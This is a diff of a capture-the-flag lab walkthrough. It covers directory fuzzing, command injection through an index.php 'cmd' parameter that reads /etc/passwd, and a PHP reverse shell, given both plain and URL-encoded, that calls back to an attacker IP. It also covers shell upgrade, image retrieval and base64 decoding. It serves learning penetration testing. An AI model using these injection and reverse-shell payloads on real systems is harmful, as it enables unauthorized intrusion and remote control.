@@ -24,18 +24,31 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 /assets               (Status: 301) [Size: 313] [--> http://10.10.254.41/assets/]
 /server-status        (Status: 403) [Size: 277]
 ```
+
+</br> looks simple enough as a webpage... 
+![port80On3](https://github.com/user-attachments/assets/6efd3f92-b2a1-4e60-b03e-89eaa372b854)
 </br> /assets exists, but it's blank
 </br> there is at least css in the /assets folder, but it's restricted
 </br> That means there is more content, but we just can't see it from the client-side
-</br> 
+![probablyeedToGoDeeperEmptyHTML](https://github.com/user-attachments/assets/9220a87e-9e97-4001-b4af-58e4a0a928c4)
+
+![assetsMustExist](https://github.com/user-attachments/assets/cb2a2ae8-2f20-4836-b66e-05a4ff919356)
+</br> contact page might be an injection vector... added to notes
+![possibleInjectionVector](https://github.com/user-attachments/assets/7176c187-0b97-45ce-b7bf-670ddc2d9d42)
+</br> images exist but are forbidden
+![imagesExistsButForbidden](https://github.com/user-attachments/assets/d35b5117-bec2-424c-b781-ce886167ace4)
+
 </br> fuzzing deeper -->
 </br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
-
 </br> seemingly there's nothing we can access here, since images is forbidden...
+</br> BRICK WALL ... I hate this
 </br> hunting through more wordlists since this can't be the comprehensive be-all-end-all...
 </br> `wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words.txt --hw 31 http://10.10.254.41:80/assets/FUZZ`
-
-</br> ! Just drill this into your head: if I find .php, I should try index.php for command injection
+![okayTheresHiddenStuffWithdots](https://github.com/user-attachments/assets/0db489e5-f311-4f41-99d5-d1837ac37b42)
+</br> revised wordlist finds stuff hidden with leading dots
+</br> ! Just drill this into your head: if I find .php, I should try `index.php` for command injection
+</br> url command injection...`url+?cmd=whoami`
+![qwefwerb](https://github.com/user-attachments/assets/c48387ca-b0b9-4f42-8bba-b9325fe0c78b)
 
 </br> `whoami`
 </br> d3d3LWRhdGEK
@@ -44,17 +57,16 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 </br> 
 </br> inject to read `cat /etc/passwd`
 </br> cm9vdDp4 (omitted) ... c2UK
+</br> it's easier to copy this junk from the field in inspector
+![copyeasierInInspector](https://github.com/user-attachments/assets/ddabee53-4f5f-44e6-bc24-3f79ece04d2e)
+
+
 </br> also read `ls -la content`
 </br> dG90YWwgMj (omitted) zcwo=
 </br> encrypted, with the = at the end looks like base64
-
-</br> `ls /home/deku | base64 -d`
-</br> it's supposed to be a user, but it's empty
-</br> 
-</br> there is an image file in /images called oneforal...
-</br> looks like the auto-decrypt might be malformed, or that name is just whack.
-</br> I cannot curl it because I don't have permission to get the resource
-</br> 
+![infoLEak4](https://github.com/user-attachments/assets/50caaa4a-47d7-40a4-9aef-f1cc1775a502)
+</br> decode it to reveal content, here it reveals the listing command I gave
+![decodeToRevealData](https://github.com/user-attachments/assets/681ff94d-9dd6-4d1a-9b98-c7841e03b9d1)
 </br> see if i can get a rev shell
 </br> 
 </br> netcat and reverse shell
@@ -63,6 +75,7 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 ```
 http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
 ```
+![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)
 
 </br> dang it, doesn't work....
 </br> I need to go to revshells.com and url encode this junk...
@@ -70,15 +83,26 @@ http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73",
 </br> (different IP because new session started, dumb timeouts...)
 ```
 http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.152.50%22%2C1984)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
-```
-</br> ^^^extract above lesson for a mini tutorial on php url injection reverse shells
-</br> 
+```![revshellurlEncode](https://github.com/user-attachments/assets/707d75d4-eb4a-49c4-b498-4af114246678)
+</br> make sure to click the url encode button on rev shells if you're doing a url injection.
+</br> ![executeINUrlImg](https://github.com/user-attachments/assets/edec1121-9999-4699-a31b-289d034239a0)
+</br> when it hangs, we should get a proper connection
+![listenerShouldHaveConnectionRecieved_IMPORTANT](https://github.com/user-attachments/assets/6f1b1289-4a98-4080-be24-7627ace77d1f)
+
 </br> upgrade to terminal session
+![upgradeTerminal1](https://github.com/user-attachments/assets/44d70dc4-5456-482b-b863-4bceeae7ed66)
+
+
 </br> python3 -c 'import pty; pty.spawn("/bin/bash")'
+</br> we find images
+![okayItems2](https://github.com/user-attachments/assets/aa5fe5ed-411b-4d2f-a6de-b29f20d79010)
 
 </br> set up a python server and a port in the directory with the images
 </br> wget the images off the port indicated by our python server; we need to use the ip of the target machine though.
+</br> set up http server, then connect with the target ip address (ignore what python says it's serving on, except for the port, the IP is the target regardless of python's message)
 </br> 
+![needToUseTargetIPInWgetRequestEvenThoPythonSays000](https://github.com/user-attachments/assets/d0edcc04-eb5e-43f6-9f0e-0167c19de6f9)
+
 </br> `wget http://10.10.4.218/assets/images/yuei.jpg`
 </br> `wget http://10.10.4.218/assets/images/oneforall.jpg`
 </br> 
@@ -88,15 +112,17 @@ http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.
 </br> file command says it's data? Let's try changing it to .jpg like it seems it should be
 </br> 
 </br> gotta use hexedit and magic numbers as if it's corrupted file data we're restoring
-</br> 
-</br> `https://en.wikipedia.org/wiki/List_of_file_signatures`
+
+</br> reference to --> `https://en.wikipedia.org/wiki/List_of_file_signatures`
 </br>  JPG starts off as : `FF D8 FF E0 00 10 4A 46 49 46 00 01`
-</br> 
+</br> ![jfifIGuess](https://github.com/user-attachments/assets/a8c18c8d-495a-4d32-bbd9-2db8339d7042)
+
 </br> `ctrl + x` --> quit editing, be sure to hit "y" to save when the prompt occurs
-</br> 
+![passphrase2123213](https://github.com/user-attachments/assets/9d5268b1-f266-44a2-870f-a284b41f5611)
+
 </br> can't open anything as it wants a password
 </br> 
-</br> in typical web enumeration fashion, we search /var/www to see what contents we got, and find a hidden dir with a txt file in it.
+</br> in typical web enumeration fashion, we search `/var/www` to see what contents we got, and find a hidden dir with a txt file in it.
 
 </br> QWxsbWlnaHRGb3JFdmVyISEhCg==
 </br> echo  QWxsbWlnaHRGb3JFdmVyISEhCg==| base64 -d
